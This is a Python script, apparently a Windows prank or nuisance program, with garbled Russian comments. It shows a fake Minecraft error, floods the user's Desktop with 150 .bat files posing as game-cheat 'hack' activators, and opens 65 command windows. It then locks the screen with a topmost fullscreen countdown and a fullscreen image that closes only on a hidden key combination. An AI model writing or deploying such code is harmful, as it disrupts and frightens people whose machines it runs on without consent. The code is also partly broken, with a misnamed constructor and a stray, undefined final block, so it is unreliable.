import os
import sys

def get_resource_path(relative_path):
    """–ü–æ–ª—É—á–∞–µ—Ç –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –ø—É—Ç—å –∫ —Ñ–∞–π–ª–∞–º –≤ EXE"""
    try:
        # –î–ª—è EXE —Ñ–∞–π–ª–∞
        base_path = sys._MEIPASS
    except Exception:
        # –î–ª—è –æ–±—ã—á–Ω–æ–≥–æ –∑–∞–ø—É—Å–∫–∞ Python
        base_path = os.path.abspath(".")
    
    return os.path.join(base_path, relative_path)

# –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –≤ –∫–æ–¥–µ:
image_path = get_resource_path("image.gif")
sound_path = get_resource_path("sound.mp3")
from tkinter import messagebox
import time

for i in range(1):
    messagebox.showerror("Minecraft","–∞–ª–ª–æ –Ω–µ–º–æ—â—å –¥–∞ –¥–∞ —Ç—ã")
    time.sleep(0.6)
import os
import time

def create_fullscreen_bat_files():
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    created = 0
    max_files = 150  # –ú–æ–∂–Ω–æ —É–≤–µ–ª–∏—á–∏—Ç—å –¥–ª—è –ø–æ–ª–Ω–æ–≥–æ –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è
    
    print("–°–æ–∑–¥–∞—é BAT —Ñ–∞–π–ª—ã –Ω–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω...")
    
    for i in range(max_files):
        try:
            # –°–æ–∑–¥–∞–µ–º BAT —Ñ–∞–π–ª —Å —Ä–∞–∑–Ω—ã–º–∏ –∏–º–µ–Ω–∞–º–∏
            bat_content = f"""@echo off
chcp 65001 >nul
title –ß–∏—Ç—ã –ê–∫—Ç–∏–≤–∞—Ç–æ—Ä {i+1}
echo ===============================
echo    –ê–ö–¢–ò–í–ê–¶–ò–Ø –ß–ò–¢–û–í v{i+1}
echo ===============================
echo.
echo –ó–∞–ø—É—Å–∫–∞–µ–º –≤–∑–ª–æ–º –∏–≥—Ä—ã...
ping -n 3 127.0.0.1 >nul
echo.
echo ‚úì 
echo.
echo –í–ó–õ–û–ú –ó–ê–í–ï–†–®–ï–ù!
echo.
pause
"""
            
            file_path = os.path.join(desktop, f"üöÄ–ß–ò–¢–´_–í–ó–õ–û–ú_{i+1:03d}.bat")
            
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(bat_content)
            
            created += 1
            
            # –ë—ã—Å—Ç—Ä–æ–µ —Å–æ–∑–¥–∞–Ω–∏–µ –±–µ–∑ –∑–∞–¥–µ—Ä–∂–µ–∫
            if created % 50 == 0:
                print(f"–°–æ–∑–¥–∞–Ω–æ {created} BAT —Ñ–∞–π–ª–æ–≤...")
                
        except Exception as e:
            print(f"–î–æ—Å—Ç–∏–≥–Ω—É—Ç –ø—Ä–µ–¥–µ–ª: {e}")
            break
    
    print(f"–ì–æ—Ç–æ–≤–æ! –°–æ–∑–¥–∞–Ω–æ {created} BAT —Ñ–∞–π–ª–æ–≤!")
    print("–û–Ω–∏ –∑–∞–ø–æ–ª–Ω—è—Ç –≤–µ—Å—å —Ä–∞–±–æ—á–∏–π —Å—Ç–æ–ª –∏ –æ—Å—Ç–∞–Ω—É—Ç—Å—è –Ω–∞–≤—Å–µ–≥–¥–∞!")

# –ó–∞–ø—É—Å–∫
create_fullscreen_bat_files()
import os
import tempfile

# –°–æ–∑–¥–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π bat —Ñ–∞–π–ª
bat_content = f'@echo off\nstart /MIN wmplayer /play /close "{r"C:\pipok\sound.mp3"}"'

with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False) as f:
    f.write(bat_content)
    bat_file = f.name

# –ó–∞–ø—É—Å–∫–∞–µ–º —Å–∫—Ä—ã—Ç—ã–π bat —Ñ–∞–π–ª
os.system(f'"{bat_file}"')

# –£–¥–∞–ª—è–µ–º bat —Ñ–∞–π–ª
os.unlink(bat_file)
time.sleep(1.0)

import os

for i in range(65):
    os.system("start cmd")
import tkinter as tk

def enhanced_black_screen():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(bg='black')
    root.attributes('-topmost', True)
    
    # –ì–ª–∞–≤–Ω—ã–π —Ç–∞–π–º–µ—Ä
    main_timer = tk.Label(
        root, 
        text="45", 
        font=("Arial", 100, "bold"), 
        fg="white", 
        bg="black"
    )
    main_timer.place(relx=0.5, rely=0.5, anchor='center')
    
    # –í–µ—Ä—Ö–Ω–∏–π —Ç–µ–∫—Å—Ç
    top_text = tk.Label(
        root,
        text="–î–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è:",
        font=("Arial", 20),
        fg="white",
        bg="black"
    )
    top_text.place(relx=0.5, rely=0.3, anchor='center')
    
    # –ù–∏–∂–Ω–∏–π —Ç–µ–∫—Å—Ç
    bottom_text = tk.Label(
        root,
        text="—Å–µ–∫—É–Ω–¥",
        font=("Arial", 20),
        fg="white",
        bg="black"
    )
    bottom_text.place(relx=0.5, rely=0.7, anchor='center')
    
    def countdown(seconds):
        if seconds >= 0:
            main_timer.config(text=str(seconds))
            
            # –ú–µ–Ω—è–µ–º —Ü–≤–µ—Ç –Ω–∞ –∫—Ä–∞—Å–Ω—ã–π –≤ –ø–æ—Å–ª–µ–¥–Ω–∏–µ 10 —Å–µ–∫—É–Ω–¥
            if seconds <= 10:
                main_timer.config(fg="red")
            else:
                main_timer.config(fg="white")
                
            root.after(1000, countdown, seconds - 1)
        else:
            root.destroy()
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º –æ—Ç—Å—á—ë—Ç
    countdown(45)
    
    # –ó–∞–∫—Ä—ã—Ç–∏–µ –ø–æ Escape
    root.bind('<Escape>', lambda e: root.destroy())
    
    root.mainloop()

enhanced_black_screen()
import tkinter as tk

class KeyCombo:
    def init(self):
        self.d_pressed = False
        self.f_pressed = False
        
    def on_key_press(self, event):
        if event.keysym == 'd':
            self.d_pressed = True
        elif event.keysym == 'f':
            self.f_pressed = True
        elif event.keysym == 'g' and self.d_pressed and self.f_pressed:
            self.root.destroy()
    
    def on_key_release(self, event):
        if event.keysym == 'd':
            self.d_pressed = False
        elif event.keysym == 'f':
            self.f_pressed = False

def show_gif_with_combo():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(bg='black')
    
    # –°–æ–∑–¥–∞–µ–º –æ–±—ä–µ–∫—Ç –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –∫–ª–∞–≤–∏—à
    key_combo = KeyCombo()
    key_combo.root = root
    
    # –ü—Ä–∏–≤—è–∑—ã–≤–∞–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –∫–ª–∞–≤–∏—à
    root.bind('<KeyPress>', key_combo.on_key_press)
    root.bind('<KeyRelease>', key_combo.on_key_release)
    
    try:
        # –ó–∞–≥—Ä—É–∂–∞–µ–º GIF
        image_path = r"C:\pipok\image.gif"
        photo = tk.PhotoImage(file=image_path)
        
        # –°–æ–∑–¥–∞–µ–º –º–µ—Ç–∫—É —Å –∫–∞—Ä—Ç–∏–Ω–∫–æ–π
        label = tk.Label(root, image=photo, bg='black')
        label.image = photo  # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å—Å—ã–ª–∫—É
        label.place(x=0, y=0, width=root.winfo_screenwidth(), height=root.winfo_screenheight())
        
    except Exception as e:
        # –ï—Å–ª–∏ –æ—à–∏–±–∫–∞, –ø–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
        label = tk.Label(root, 
                        text=f"–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ GIF: {e}\n\n–î–ª—è –≤—ã—Ö–æ–¥–∞:\n1. –ó–∞–∂–º–∏—Ç–µ D\n2. –ó–∞–∂–º–∏—Ç–µ F\n3. –ù–∞–∂–º–∏—Ç–µ G", 
                        fg="white", bg="black", font=("Arial", 20))
        label.pack(expand=True)
    
    # –î–æ–±–∞–≤–ª—è–µ–º —Ç–µ–∫—Å—Ç–æ–≤—É—é –ø–æ–¥—Å–∫–∞–∑–∫—É –ø–æ–≤–µ—Ä—Ö –∫–∞—Ä—Ç–∏–Ω–∫–∏
    
    
    
        instruction.place(relx=0.5, rely=0.95, anchor='center')
    
    
